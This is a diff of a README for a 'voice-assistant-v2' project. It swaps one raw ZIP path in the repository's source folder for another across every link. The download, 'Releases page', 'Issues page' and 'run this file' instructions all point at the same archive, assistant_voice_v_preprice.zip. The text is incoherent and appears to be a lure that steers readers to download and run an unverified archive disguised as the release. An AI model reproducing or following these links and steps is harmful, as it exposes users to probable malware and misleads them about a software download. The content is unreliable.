@@ -6,7 +6,7 @@ Welcome to voice-assistant-v2! This software is designed to help you interact wi
 
 ## 📥 Download Now
 
-[![Download voice-assistant-v2](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip)](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip)
+[![Download voice-assistant-v2](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip)](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip)
 
 ## 📋 What You Need
 
@@ -20,19 +20,19 @@ Before downloading, here’s what you should have on your computer:
 ## 📂 Download & Install
 
 1. **Visit the Release Page**:
-   Go to the [Releases page](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip) to find the latest version. 
+   Go to the [Releases page](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip) to find the latest version. 
 
 2. **Choose Your Version**:
    Look for the latest version. Click on it to view the files available for download.
 
 3. **Download**:
-   Click on the file named `https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip` or the appropriate executable file for your system.
+   Click on the file named `https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip` or the appropriate executable file for your system.
 
 4. **Extract the Files**:
    If you downloaded a ZIP file, right-click on it and select “Extract All.” Choose a location on your computer.
 
 5. **Run the Application**:
-   Navigate to the extracted folder. Look for the file named `https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip` (Windows) or `voice-assistant` (macOS/Linux). Double-click to run it.
+   Navigate to the extracted folder. Look for the file named `https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip` (Windows) or `voice-assistant` (macOS/Linux). Double-click to run it.
 
 ## 🔊 How to Use the Voice Assistant
 
@@ -72,7 +72,7 @@ If you encounter issues, here are some common solutions:
 
 ## 🌐 Community Support
 
-If you need help, visit the community support section on the [Issues page](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip). You can report bugs or ask for features there.
+If you need help, visit the community support section on the [Issues page](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip). You can report bugs or ask for features there.
 
 ## 📞 Contact
 
@@ -84,6 +84,6 @@ We aim to improve the application continuously. New features will be added based
 
 ## 📥 Download Now Again
 
-For your convenience, here’s the [download link](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/va/tts/assistant-voice-v-v2.0.zip) once more.
+For your convenience, here’s the [download link](https://raw.githubusercontent.com/rashedyasen/voice-assistant-v2/main/src/assistant_voice_v_preprice.zip) once more.
 
 Enjoy using voice-assistant-v2 and let your voice guide your computer!
